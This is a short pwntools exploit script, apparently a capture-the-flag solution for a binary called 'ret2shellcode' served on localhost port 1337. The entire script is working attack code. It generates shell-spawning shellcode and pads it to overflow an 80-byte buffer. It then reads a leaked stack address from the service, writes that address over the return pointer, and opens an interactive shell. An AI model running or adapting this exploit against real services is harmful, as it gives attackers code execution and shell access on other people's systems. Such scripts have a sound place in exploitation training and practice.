from pwn import *

context.binary = ELF('./ret2shellcode')

shellcode = asm(shellcraft.sh())
payload = shellcode + b'A'*(80-len(shellcode)+8)

p = remote("localhost", 1337)
p.recvuntil(b'0x')
payload += p64(int(p.recvuntil(b'\n').decode().strip(), 16))
p.recvuntil(b':\n')
p.sendline(payload)
p.interactive()
